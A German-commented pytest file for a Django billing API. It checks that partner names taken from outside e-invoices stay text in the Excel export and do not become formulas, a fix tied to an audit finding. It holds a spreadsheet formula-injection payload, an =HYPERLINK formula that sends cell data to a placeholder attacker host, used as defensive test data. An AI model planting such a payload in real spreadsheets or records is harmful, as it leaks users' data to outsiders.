"""Partner-Excel ohne Formeln aus fremden Daten (Gesamtaudit 15.11., PUB-03).

Verkäufernamen aus fremden E-Rechnungen landen in den Stammdaten der Geschäftspartner. Ein
Name wie ``=HYPERLINK(…)`` wurde im Export zur Formel. Jetzt bleibt er Text. Erfundene Daten.
"""

import io

import pytest
from openpyxl import load_workbook

pytestmark = pytest.mark.django_db
JSON = "application/json"
BOESE = '=HYPERLINK("https://angreifer.example.invalid/?d="&B2;"Rechnung")'


def test_formel_bleibt_text(api, orgs, board_a):
    c = api(board_a)
    base = f"/api/orgs/{orgs['a'].pk}/billing/"
    resp = c.post(
        f"{base}partners/", {"details": {"name": BOESE, "city": "=1+1"}}, content_type=JSON
    )
    assert resp.status_code == 201, resp.content
    partner = resp.json()
    resp = c.post(
        f"{base}partners/{partner['id']}/contacts/",
        {"last_name": "=2*3", "first_name": "Erika"},
        content_type=JSON,
    )
    book = load_workbook(io.BytesIO(c.get(f"{base}partners/export/").content))
    cells = [cell for sheet in book.worksheets for row in sheet.iter_rows() for cell in row]
    texts = [cell for cell in cells if isinstance(cell.value, str) and cell.value.startswith("=")]
    assert texts, "Testdaten fehlen im Export"
    assert all(cell.data_type == "s" for cell in texts)
